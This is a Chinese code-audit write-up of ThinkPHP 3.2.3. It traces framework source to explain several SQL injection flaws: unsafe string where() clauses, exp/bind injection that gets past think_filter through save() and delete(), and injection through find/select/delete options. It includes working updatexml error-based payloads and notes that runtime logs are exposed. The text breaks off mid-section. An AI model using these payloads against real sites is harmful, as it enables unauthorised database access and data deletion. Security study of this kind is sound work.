[ThinkPHP3.2.3完整版](https://www.thinkphp.cn/download/610.html)

[总结ThinkPHP v3的代码审计方法](https://www.freebuf.com/vuls/282906.html)

[敏信审计系列之THINKPHP3.2开发框架 ](https://mp.weixin.qq.com/s/4xXS7usHMFNgDTEHcHBcBA)

[Thinkphp多个版本注入分析](https://hu3sky.github.io/2019/09/24/Thinkphp%E5%A4%9A%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/)

[水文-Thinkphp3.2.3安全开发须知](https://xz.aliyun.com/t/2630)

## cms组成

```
├─Application   项目目录
│  ├─Common   公共模块
│  │  ├─Common
│  │  └─Conf
│  ├─Home   前台模块
│  │  ├─Common   公共函数
│  │  ├─Conf   配置文件
│  │  ├─Controller   控制器
│  │  ├─Model   模型
│  │  └─View   视图
│  └─Runtime
│      ├─Cache
│      │  └─Home
│      ├─Data
│      ├─Logs
│      │  └─Home
│      └─Temp
├─Public   资源文件目录
└─ThinkPHP   框架目录
    ├─Common
    ├─Conf
    ├─Lang
    ├─Library
    │  ├─Behavior
    │  ├─Org
    │  │  ├─Net
    │  │  └─Util
    │  ├─Think
    │  │  ├─Cache
    │  │  │  └─Driver
    │  │  ├─Controller
    │  │  ├─Crypt
    │  │  │  └─Driver
    │  │  ├─Db
    │  │  │  └─Driver
    │  │  ├─Image
    │  │  │  └─Driver
    │  │  ├─Log
    │  │  │  └─Driver
    │  │  ├─Model
    │  │  ├─Session
    │  │  │  └─Driver
    │  │  ├─Storage
    │  │  │  └─Driver
    │  │  ├─Template
    │  │  │  ├─Driver
    │  │  │  └─TagLib
    │  │  ├─Upload
    │  │  │  └─Driver
    │  │  │      ├─Bcs
    │  │  │      └─Qiniu
    │  │  └─Verify
    │  │      ├─bgs
    │  │      ├─ttfs
    │  │      └─zhttfs
    │  └─Vendor
    │      ├─Boris
    │      ├─EaseTemplate
    │      ├─Hprose
    │      ├─jsonRPC
    │      ├─phpRPC
    │      │  ├─dhparams
    │      │  └─pecl
    │      │      └─xxtea
    │      │          └─test
    │      ├─SmartTemplate
    │      ├─Smarty
    │      │  ├─plugins
    │      │  └─sysplugins
    │      ├─spyc
    │      │  ├─examples
    │      │  ├─php4
    │      │  └─tests
    │      └─TemplateLite
    │          └─internal
    ├─Mode
    │  ├─Api
    │  ├─Lite
    │  └─Sae
    └─Tpl
```

在`Application\Runtime\Logs\Home`中含有thinkphp的运行日志,运行日志放置在网站部署目录下,直接暴露于外部,可以让攻击者获取运行日志并进行分析

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203151656805.png)

日志命名格式为`年_月_日.log`,因此可以编写脚本进行批量获取

作为一个mvc框架的cms,重点应该关注项目目录即`Application`(但是可以被设置成其他目录)   

模型:封装与应用程序的业务逻辑相关的数据以及对数据的处理方法

视图:数据显示

控制器:处理用户交互,从视图读取数据,向模型发送数据,也是主要审计的点

## 参数传递

除了使用传统的`$_GET`和`$_POST`外,thinkphp新增了一个`I`方法(`function I`),用于安全地获取用户输入

使用方法如下

```php
1. I('id',0); 获取id参数 自动判断get或者post
2. I('post.name','','htmlspecialchars'); 获取$_POST['name']并使用htmlspecialchars进行过滤
3. I('get.'); 获取$_GET
```

`ThinkPHP/Common/functions.php`

```php
/**
 * 获取输入参数 支持过滤和默认值
 * 使用方法:
 * <code>
 * I('id',0); 获取id参数 自动判断get或者post
 * I('post.name','','htmlspecialchars'); 获取$_POST['name']
 * I('get.'); 获取$_GET
 * </code>
 * @param string $name 变量的名称 支持指定类型
 * @param mixed $default 不存在的时候默认值
 * @param mixed $filter 参数过滤方法
 * @param mixed $datas 要获取的额外数据源
 * @return mixed
 */
function I($name,$default='',$filter=null,$datas=null) {
	static $_PUT	=	null;
	if(strpos($name,'/')){ // 指定修饰符
		list($name,$type) 	=	explode('/',$name,2);// name/s => array('name','s') => $name='name' $type=s 字符串
	}elseif(C('VAR_AUTO_STRING')){ // 默认强制转换为字符串
        $type   =   's';
    }
    if(strpos($name,'.')) { // 指定参数来源
        list($method,$name) =   explode('.',$name,2);// get.a => $method=get $name=a
    }else{ // 默认为自动判断
        $method =   'param';
    }
    switch(strtolower($method)) {
        case 'get'     :   
        	$input =& $_GET;
        	break;
        case 'post'    :   
        	$input =& $_POST;
        	break;
        case 'put'     :   
        	if(is_null($_PUT)){
            	parse_str(file_get_contents('php://input'), $_PUT);
        	}
        	$input 	=	$_PUT;        
        	break;
        case 'param'   :
            switch($_SERVER['REQUEST_METHOD']) {
                case 'POST':
                    $input  =  $_POST;
                    break;
                case 'PUT':
                	if(is_null($_PUT)){
                    	parse_str(file_get_contents('php://input'), $_PUT);
                	}
                	$input 	=	$_PUT;
                    break;
                default:
                    $input  =  $_GET;
            }
            break;
        case 'path'    :   
            $input  =   array();
            if(!empty($_SERVER['PATH_INFO'])){
                $depr   =   C('URL_PATHINFO_DEPR');
                $input  =   explode($depr,trim($_SERVER['PATH_INFO'],$depr));            
            }
            break;
        case 'request' :   
        	$input =& $_REQUEST;   
        	break;
        case 'session' :   
        	$input =& $_SESSION;   
        	break;
        case 'cookie'  :   
        	$input =& $_COOKIE;    
        	break;
        case 'server'  :   
        	$input =& $_SERVER;    
        	break;
        case 'globals' :   
        	$input =& $GLOBALS;    
        	break;
        case 'data'    :   
        	$input =& $datas;      
        	break;
        default:
            return null;
    }
    if(''==$name) { // 获取全部变量
        $data       =   $input;
        $filters    =   isset($filter)?$filter:C('DEFAULT_FILTER');//默认情况下为 htmlspecialchars
        if($filters) {
            if(is_string($filters)){
                $filters    =   explode(',',$filters);
            }
            foreach($filters as $filter){
                $data   =   array_map_recursive($filter,$data); // 参数过滤
            }
        }
    }elseif(isset($input[$name])) { // 取值操作
        $data       =   $input[$name];
        $filters    =   isset($filter)?$filter:C('DEFAULT_FILTER');
        if($filters) {
            if(is_string($filters)){
                if(0 === strpos($filters,'/')){
                    if(1 !== preg_match($filters,(string)$data)){
                        // 支持正则验证
                        return   isset($default) ? $default : null;
                    }
                }else{
                    $filters    =   explode(',',$filters);                    
                }
            }elseif(is_int($filters)){
                $filters    =   array($filters);
            }
            
            if(is_array($filters)){
                foreach($filters as $filter){
                    if(function_exists($filter)) {
                        $data   =   is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤
                    }else{
                        $data   =   filter_var($data,is_int($filter) ? $filter : filter_id($filter));
                        if(false === $data) {
                            return   isset($default) ? $default : null;
                        }
                    }
                }
            }
        }
        if(!empty($type)){
        	switch(strtolower($type)){
        		case 'a':	// 数组
        			$data 	=	(array)$data;
        			break;
        		case 'd':	// 数字
        			$data 	=	(int)$data;
        			break;
        		case 'f':	// 浮点
        			$data 	=	(float)$data;
        			break;
        		case 'b':	// 布尔
        			$data 	=	(boolean)$data;
        			break;
                case 's':   // 字符串
                default:
                    $data   =   (string)$data;
        	}
        }
    }else{ // 变量默认值
        $data       =    isset($default)?$default:null;
    }
    is_array($data) && array_walk_recursive($data,'think_filter');
    return $data;
}

function think_filter(&$value){
    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){
        $value .= ' ';
    }
}
```

## 其他快捷方法

`ThinkPHP/Common/functions.php`

`D`方法用于实例化模型类

`M`方法用于实例化没有模型文件的Model

`C`方法用于读取配置

在`Application/Home/Model/UserModel.class.php`中写入

```php
<?php
namespace Home\Model;
use Think\Model;
class UserModel extends Model
{
    public $a='asdf';
}
```

在`Application/Home/Controller/IndexController.class.php`中写入

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User=new \Home\Model\UserModel();
        var_dump($User->a);
        $User=D('User');//等价于 $User=new \Home\Model\UserModel();
        var_dump($User->a);
        $User=M('User');//等价于 $User=new \Think\Model('User');
        var_dump($User->a);
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203152045285.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203152114255.png)

```php
C:\phpstudy_pro\WWW\thinkphp_3.2.3\Application\Home\Controller\IndexController.class.php:7:string 'asdf' (length=4)
C:\phpstudy_pro\WWW\thinkphp_3.2.3\Application\Home\Controller\IndexController.class.php:9:string 'asdf' (length=4)
C:\phpstudy_pro\WWW\thinkphp_3.2.3\Application\Home\Controller\IndexController.class.php:11:null
```

```php
/**
 * 实例化模型类 格式 [资源://][模块/]模型
 * @param string $name 资源地址
 * @param string $layer 模型层名称
 * @return Think\Model
 */
function D($name='',$layer='') {
    if(empty($name)) return new Think\Model;
    static $_model  =   array();
    $layer          =   $layer? : C('DEFAULT_M_LAYER');
    if(isset($_model[$name.$layer]))
        return $_model[$name.$layer];
    $class          =   parse_res_name($name,$layer);//导入类库
    if(class_exists($class)) {
        $model      =   new $class(basename($name));
    }elseif(false === strpos($name,'/')){
        // 自动加载公共模块下面的模型
        if(!C('APP_USE_NAMESPACE')){
            import('Common/'.$layer.'/'.$class);
        }else{
            $class      =   '\\Common\\'.$layer.'\\'.$name.$layer;
        }
        $model      =   class_exists($class)? new $class($name) : new Think\Model($name);
    }else {
        Think\Log::record('D方法实例化没找到模型类'.$class,Think\Log::NOTICE);
        $model      =   new Think\Model(basename($name));
    }
    $_model[$name.$layer]  =  $model;
    return $model;
}
```

```php
/**
 * 实例化一个没有模型文件的Model
 * @param string $name Model名称 支持指定基础模型 例如 MongoModel:User
 * @param string $tablePrefix 表前缀
 * @param mixed $connection 数据库连接信息
 * @return Think\Model
 */
function M($name='', $tablePrefix='',$connection='') {
    static $_model  = array();
    if(strpos($name,':')) {
        list($class,$name)    =  explode(':',$name);
    }else{
        $class      =   'Think\\Model';
    }
    $guid           =   (is_array($connection)?implode('',$connection):$connection).$tablePrefix . $name . '_' . $class;
    if (!isset($_model[$guid]))
        $_model[$guid] = new $class($name,$tablePrefix,$connection);
    return $_model[$guid];
}
```

```php
/**
 * 获取和设置配置参数 支持批量定义
 * @param string|array $name 配置变量
 * @param mixed $value 配置值
 * @param mixed $default 默认值
 * @return mixed
 */
function C($name=null, $value=null,$default=null) {
    static $_config = array();
    // 无参数时获取所有
    if (empty($name)) {
        return $_config;
    }
    // 优先执行设置获取或赋值
    if (is_string($name)) {
        if (!strpos($name, '.')) {
            $name = strtoupper($name);
            if (is_null($value))
                return isset($_config[$name]) ? $_config[$name] : $default;
            $_config[$name] = $value;
            return null;
        }
        // 二维数组设置和获取支持
        $name = explode('.', $name);
        $name[0]   =  strtoupper($name[0]);
        if (is_null($value))
            return isset($_config[$name[0]][$name[1]]) ? $_config[$name[0]][$name[1]] : $default;
        $_config[$name[0]][$name[1]] = $value;
        return null;
    }
    // 批量设置
    if (is_array($name)){
        $_config = array_merge($_config, array_change_key_case($name,CASE_UPPER));
        return null;
    }
    return null; // 避免非法参数
}
```

实例化一个空模型类即可进行sql查询

```php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $m = M();//$m = new Model();
        $m->query('select user();');
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203152126210.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203152126014.png)

## sql注入

### 双引号包裹导致变量被直接解析

>严格来说,这个漏洞产生的原因在于开发者没有正确地使用框架

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user");
        $name = I('GET.name');
        $res = $User->field('id,username,password')->where("username='$name'")->select();
    }
}
```

默认情况下`I`方法只会对参数进行`htmlspecialchars`即html编码,不会进行如`addslashes`等操作

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203171414284.png)

而在`Model.class.php`的`where`方法中,在`parse`没有设置的情况下,不会进行`escapeString`操作

```php
    /**
     * 指定查询条件 支持安全过滤
     * @access public
     * @param mixed $where 条件表达式
     * @param mixed $parse 预处理参数
     * @return Model
     */
    public function where($where,$parse=null){
        if(!is_null($parse) && is_string($where)) {
            if(!is_array($parse)) {
                $parse = func_get_args();
                array_shift($parse);
            }
            $parse = array_map(array($this->db,'escapeString'),$parse);//addslashes
            $where =   vsprintf($where,$parse);
        }elseif(is_object($where)){
            $where  =   get_object_vars($where);
        }
        if(is_string($where) && '' != $where){
            $map    =   array();
            $map['_string']   =   $where;
            $where  =   $map;
        }        
        if(isset($this->options['where'])){
            $this->options['where'] =   array_merge($this->options['where'],$where);
        }else{
            $this->options['where'] =   $where;
        }
        
        return $this;
    }
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203171428217.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203171433361.png)

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user");
        $name = I('GET.name');
        $res = $User->field('id,username,password')->where("username='%s'",$name)->select();
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203171435896.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203171437191.png)

还可以使用`array("username"=>$name)`进行传参,在`$this->parseWhere(!empty($options['where'])?$options['where']:''),`进行参数处理并进行`escapeString`操作,具体流程如下

```php
#ThinkPHP/Library/Think/Model.class.php
//$this->options['where'] = $where;
public function select($options=array()) {
    $options = $this->_parseOptions($options);//$this->options 转化为 $options
    ...
    $resultSet  = $this->db->select($options);
    ...
}

#ThinkPHP/Library/Think/Db/Driver.class.php
public function select($options=array()) {
    $this->model  =   $options['model'];
    $this->parseBind(!empty($options['bind'])?$options['bind']:array());
    $sql    = $this->buildSelectSql($options);
    $result   = $this->query($sql,!empty($options['fetch_sql']) ? true : false);
    return $result;
}

public function buildSelectSql($options=array()) {
    ...
    $sql = $this->parseSql($this->selectSql,$options);
}

/**
 * 替换SQL语句中表达式
 * @access public
 * @param array $options 表达式
 * @return string
 */
public function parseSql($sql,$options=array()){
    $sql   = str_replace(
    array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'),
    array(
            $this->parseTable($options['table']),
            $this->parseDistinct(isset($options['distinct'])?$options['distinct']:false),
            $this->parseField(!empty($options['field'])?$options['field']:'*'),
            $this->parseJoin(!empty($options['join'])?$options['join']:''),
            $this->parseWhere(!empty($options['where'])?$options['where']:''),//对where语句进行分析
            $this->parseGroup(!empty($options['group'])?$options['group']:''),
            $this->parseHaving(!empty($options['having'])?$options['having']:''),
            $this->parseOrder(!empty($options['order'])?$options['order']:''),
            $this->parseLimit(!empty($options['limit'])?$options['limit']:''),
            $this->parseUnion(!empty($options['union'])?$options['union']:''),
            $this->parseLock(isset($options['lock'])?$options['lock']:false),
            $this->parseComment(!empty($options['comment'])?$options['comment']:''),
            $this->parseForce(!empty($options['force'])?$options['force']:'')
    ),$sql);
    return $sql;
}

protected function parseWhere($where) {
    foreach ($where as $key=>$val){
    if(0===strpos($key,'_')) {
        // 解析特殊条件表达式
        $whereStr   .= $this->parseThinkWhere($key,$val);//查询条件判断
    }
    else{
        // 查询字段的安全过滤
        $multi  = is_array($val) &&  isset($val['_multi']);
        $key    = trim($key);
        ...
        $whereStr .= $this->parseWhereItem($this->parseKey($key),$val);//parseWhereItem where子单元分析 / parseKey 字段和表名处理 column_name -> `column_name`
    }
}

protected function parseWhereItem($key,$val) {
    $whereStr = '';
    if(is_array($val)) {
        if(is_string($val[0])) {
			$exp	=	strtolower($val[0]);
            if(preg_match('/^(eq|neq|gt|egt|lt|elt)$/',$exp)) { // 比较运算
                ...$this->parseValue($val[1]);
            }elseif(preg_match('/^(notlike|like)$/',$exp)){// 模糊查找
                if(is_array($val[1])) {
                    $likeLogic  =   isset($val[2])?strtoupper($val[2]):'OR';
                    if(in_array($likeLogic,array('AND','OR','XOR'))){
                        $like       =   array();
                        foreach ($val[1] as $item){
                            $like[] = ...$this->parseValue($item);
                        }
                        $whereStr .= '('.implode(' '.$likeLogic.' ',$like).')';                          
                    }
                }else{
                    $whereStr .= ...$this->parseValue($val[1]);
                }
            }elseif('bind' == $exp ){ // 使用表达式
                $whereStr .= $key.' = :'.$val[1]; # !!! 可能存在利用点,因为没有进行parseValue
            }elseif('exp' == $exp ){ // 使用表达式
                $whereStr .= $key.' '.$val[1]; # !!! 可能存在利用点,因为没有进行parseValue
            }elseif(preg_match('/^(notin|not in|in)$/',$exp)){ // IN 运算
                if(isset($val[2]) && 'exp'==$val[2]) {
                    $whereStr .= $key.' '.$this->exp[$exp].' '.$val[1]; # !!! 可能存在利用点,因为没有进行parseValue
                }else{
                    ...
                }
            }elseif(preg_match('/^(notbetween|not between|between)$/',$exp)){ // BETWEEN运算
                ...
            }else{
                E(L('_EXPRESS_ERROR_').':'.$val[0]);
            }
        }else {
            $count = count($val);
            $rule  = isset($val[$count-1]) ? (is_array($val[$count-1]) ? strtoupper($val[$count-1][0]) : strtoupper($val[$count-1]) ) : '' ; 
            if(in_array($rule,array('AND','OR','XOR'))) {
                $count  = $count -1;
            }else{
                $rule   = 'AND';
            }
            for($i=0;$i<$count;$i++) {
                $data = is_array($val[$i])?$val[$i][1]:$val[$i];
                if('exp'==strtolower($val[$i][0])) {
                    $whereStr .= $key.' '.$data.' '.$rule.' '; # !!! 可能存在利用点,因为没有进行parseValue
                }else{
                    $whereStr .= $this->parseWhereItem($key,$val[$i]).' '.$rule.' ';
                }
            }
            $whereStr = '( '.substr($whereStr,0,-4).' )';
        }
    }else {
        //对字符串类型字段采用模糊匹配
        $likeFields   =   $this->config['db_like_fields'];
        if($likeFields && preg_match('/^('.$likeFields.')$/i',$key)) {
            $whereStr .= $key.' LIKE '.$this->parseValue('%'.$val.'%');
        }else {
            $whereStr .= $key.' = '.$this->parseValue($val);
        }
    }
    return $whereStr;
}

protected function parseValue($value) {
    if(is_string($value)) {
        $value =  strpos($value,':') === 0 && in_array($value,array_keys($this->bind))? $this->escapeString($value) : '\''.$this->escapeString($value).'\'';//escapeString -> addslashes
    }elseif(isset($value[0]) && is_string($value[0]) && strtolower($value[0]) == 'exp'){
        $value =  $this->escapeString($value[1]);
    }elseif(is_array($value)) {
        $value =  array_map(array($this, 'parseValue'),$value);
    }elseif(is_bool($value)){
        $value =  $value ? '1' : '0';
    }elseif(is_null($value)){
        $value =  'null';
    }
    return $value;
}
```

### bind注入

前面提到在`ThinkPHP/Library/Think/Db/Driver.class.php`的`parseWhereItem`函数中,满足某些条件时可以绕过`parseValue`的`addslashes`处理

```php
elseif('bind' == $exp ){ // 使用表达式
    $whereStr .= $key.' = :'.$val[1]; # !!! 可能存在利用点,因为没有进行parseValue
}elseif('exp' == $exp ){ // 使用表达式
    $whereStr .= $key.' '.$val[1]; # !!! 可能存在利用点,因为没有进行parseValue
}
...
$count = count($val);
$rule  = isset($val[$count-1]) ? (is_array($val[$count-1]) ? strtoupper($val[$count-1][0]) : strtoupper($val[$count-1]) ) : '' ; 
if(in_array($rule,array('AND','OR','XOR'))) {
    $count  = $count -1;
}else{
    $rule   = 'AND';
}
for($i=0;$i<$count;$i++) {
    $data = is_array($val[$i])?$val[$i][1]:$val[$i];
    if('exp'==strtolower($val[$i][0])) {
        $whereStr .= $key.' '.$data.' '.$rule.' '; # !!! 可能存在利用点,因为没有进行parseValue
    }
}
```

传入`name[]=exp`或者`name[][]=exp`,debug时会发现字符串`exp`会在后面增加一个空格

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203172040630.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203172041491.png)

原因在于前面提到的`I`的方法的特殊处理,在`I`方法的最后调用了`think_filter`这一过滤函数,在敏感词的后面加了一个空格

这里有两种处理方法

1. 不使用`I`方法获取参数,直接使用`$_GET`进行获取

`$name = $_GET['name'];`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191553196.png)

`name[]=exp&name[]==1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191556302.png)

2. 绕过`think_filter`限制

注意到在`parseWhereItem`函数是会对`bind`进行特殊处理的,但是`think_filter`没有对`bind`进行过滤,由此当`name[]=bind`时,可以将数据

```php
    is_array($data) && array_walk_recursive($data,'think_filter');
    return $data;
}

function think_filter(&$value){
    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){
        $value .= ' ';
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191546247.png)

最终得到的`wherestr`为

```
`username` = :asdf
```

由于`=:`的存在,这玩意用来引用绑定变量,我们要消除`:`对于sql语句的影响

1. 使用`save`方法

thinkphp将update操作封装在`save`方法中

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user");
        $name = I('GET.name');
        $data['password'] = '123456';
        $res = $User->where(array('username'=>$name))->save($data);
    }
}
```

`name[]=bind&name[]=0 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191638475.png)

`save`方法同样会调用`parseWhere`并进入到`parseWhereItem`中

```php
#ThinkPHP/Library/Think/Model.class.php
public function save($data='',$options=array()) {
    ...
    if(is_array($options['where']) && isset($options['where'][$pk])){
        $pkValue    =   $options['where'][$pk];
    }
    if(false === $this->_before_update($data,$options)) {
        return false;
    }
    $result     =   $this->db->update($data,$options);
    if(false !== $result && is_numeric($result)) {
        if(isset($pkValue)) $data[$pk]   =  $pkValue;
        $this->_after_update($data,$options);
    }
    return $result;
}
#ThinkPHP/Library/Think/Db/Driver.class.php
public function update($data,$options) {
    $this->model  =   $options['model'];
    $this->parseBind(!empty($options['bind'])?$options['bind']:array());
    $table  =   $this->parseTable($options['table']);
    $sql   = 'UPDATE ' . $table . $this->parseSet($data); //关键点1
    if(strpos($table,',')){// 多表更新支持JOIN操作
        $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:'');
    }
    $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');//关键点2
    if(!strpos($table,',')){
        //  单表更新支持order和lmit
        $sql .= $this->parseOrder(!empty($options['order'])?$options['order']:'').$this->parseLimit(!empty($options['limit'])?$options['limit']:'');
    }
    $sql .= $this->parseComment(!empty($options['comment'])?$options['comment']:'');
    return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);//关键点3
}
```

首先在`parseSet`对`=:`进行解析

```php
#ThinkPHP/Library/Think/Db/Driver.class.php
protected function parseSet($data) {
    foreach ($data as $key=>$val){
        if(is_array($val) && 'exp' == $val[0]){
            $set[]  =   $this->parseKey($key).'='.$val[1];
        }elseif(is_null($val)){
            $set[]  =   $this->parseKey($key).'=NULL';
        }elseif(is_scalar($val)) {// 过滤非标量数据
            if(0===strpos($val,':') && in_array($val,array_keys($this->bind)) ){
                $set[]  =   $this->parseKey($key).'='.$this->escapeString($val);
            }else{
                $name   =   count($this->bind);
                $set[]  =   $this->parseKey($key).'=:'.$name;
                $this->bindParam($name,$val);
            }
        }
    }
    return ' SET '.implode(',',$set);
}
#ThinkPHP/Library/Think/Db/Driver.class.php
protected function bindParam($name,$value){
    $this->bind[':'.$name]  =   $value;
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191722861.png)

然后进行`parseWhereItem`操作

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191638739.png)

此时`wherestr`的值为

```
`username` = :0 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)
```

在返回到`parseWhere`后得到的`wherestr`为

```
 WHERE `username` = :0 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)
```

此时`$sql`为

```
UPDATE `user` SET `password`=:0 WHERE `username` = :0 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)
```

最后进入到`execute`函数中

```php
public function execute($str,$fetchSql=false) {
    ...

    if(!empty($this->bind)){
        $that   =   $this;
        $this->queryStr =   strtr($this->queryStr,array_map(function($val) use($that){ return '\''.$that->escapeString($val).'\''; },$this->bind));
    }

    ...
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191707272.png)

`bind=array(':0'=>'123456')`

首先通过`array_map`对`bind`数组的每个元素进行`addslashes`操作,然后利用`strtr`对`$this->queryStr`进行替换(`:0`被替换成`123456`)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191710202.png)

由此造成了sql注入

2. 使用`delete`方法

>这个利用方法比较奇怪...

查找`parseWhere`的用法,除了`update`方法外,还有`delete`方法对其进行调用

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201233880.png)

```php
    public function delete($options=array()) {
        $this->model  =   $options['model'];
        $this->parseBind(!empty($options['bind'])?$options['bind']:array());
        $table  =   $this->parseTable($options['table']);
        $sql    =   'DELETE FROM '.$table;
        if(strpos($table,',')){// 多表删除支持USING和JOIN操作
            if(!empty($options['using'])){
                $sql .= ' USING '.$this->parseTable($options['using']).' ';
            }
            $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:'');
        }
        $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');
        if(!strpos($table,',')){
            // 单表删除支持order和limit
            $sql .= $this->parseOrder(!empty($options['order'])?$options['order']:'')
            .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');
        }
        $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');
        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);
    }
```

但由于`parseSet`在`delete`方法中不存在,因此这里需要手动添加`bind`

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user");
        $name = I('GET.name');
        $data['password']='123456';
        $res = $User->where(array('username'=>$name))->bind($data)->delete();
    }
}
```

```php
    /**
     * 参数绑定
     * @access public
     * @param string $key  参数名
     * @param mixed $value  绑定的变量及绑定参数
     * @return Model
     */
    public function bind($key,$value=false) {
        if(is_array($key)){
            $this->options['bind'] =    $key;
        }else{
            $num =  func_num_args();
            if($num>2){
                $params =   func_get_args();
                array_shift($params);
                $this->options['bind'][$key] =  $params;
            }else{
                $this->options['bind'][$key] =  $value;
            }        
        }
        return $this;
    }
```


`name[]=bind&name[]=password and updatexml(1,concat(0x7e,(select @@version),0x7e),1)`

thinkphp构造出的sql语句为

```
DELETE FROM `user` WHERE `username` = :'123456' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)
```

实际执行语句为

```
DELETE FROM `user` WHERE `username` = '123456' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201433160.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201406099.png)

### find() select() delete()注入

`find() select() delete()`这三个函数的参数中均有`$options`,且在满足一定条件时可以直接拼接到sql语句中

```php
    /**
     * 查询数据
     * @access public
     * @param mixed $options 表达式参数
     * @return mixed
     */
    public function find($options=array()) {
        ...
        // 总是查找一条记录
        $options['limit']   =   1;
        // 分析表达式
        $options            =   $this->_parseOptions($options);//$options可控并传递到$this->db->select中
        ...
        $resultSet          =   $this->db->select($options);//跟前面的分析过程一样,进入parseWhere,同时因为$options['where']是字符串,所以直接进行拼接并返回,最终传入到$this->db->query中
        ...
    }

    /**
     * 查询数据集
     * @access public
     * @param array $options 表达式参数
     * @return mixed
     */
    public function select($options=array()) {//利用方法同find()
        ...
        // 分析表达式
        $options    =  $this->_parseOptions($options);
        ...
        $resultSet  = $this->db->select($options);
        ...
    }

    /**
     * 删除数据
     * @access public
     * @param mixed $options 表达式
     * @return mixed
     */
    public function delete($options=array()) {
        ...
        // 分析表达式
        $options =  $this->_parseOptions($options);
        if(is_array($options['where']) && isset($options['where'][$pk])){
            $pkValue            =  $options['where'][$pk];
        }

        if(false === $this->_before_delete($options)) {
            return false;
        }        
        $result  =    $this->db->delete($options);
        ...
    }

    protected function _parseOptions($options=array()) {//当$options['where']是字符串时,直接返回
        if(is_array($options))
            $options =  array_merge($this->options,$options);
        // 字段类型验证
        if(isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join'])) {
            // 对数组查询条件进行字段类型检查
            ...
        }
        return $options;
    }
```

```php
    public function select($options=array()) {
        $this->model  =   $options['model'];
        $this->parseBind(!empty($options['bind'])?$options['bind']:array());
        $sql    = $this->buildSelectSql($options);
        $result   = $this->query($sql,!empty($options['fetch_sql']) ? true : false);
        return $result;
    }

    public function buildSelectSql($options=array()) {
        ...
        $sql  =   $this->parseSql($this->selectSql,$options);
        return $sql;
    }

    public function parseSql($sql,$options=array()){
        $sql   = str_replace(
            array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'),
            array(
                ...
                $this->parseWhere(!empty($options['where'])?$options['where']:''),
                ...
            ),$sql);
        return $sql;
    }
    protected function parseWhere($where) {
        $whereStr = '';
        if(is_string($where)) {
            // 直接使用字符串条件
            $whereStr = $where;
        }
        return empty($whereStr)?'':' WHERE '.$whereStr;
    }

    public function delete($options=array()) {
        $this->model  =   $options['model'];
        $this->parseBind(!empty($options['bind'])?$options['bind']:array());
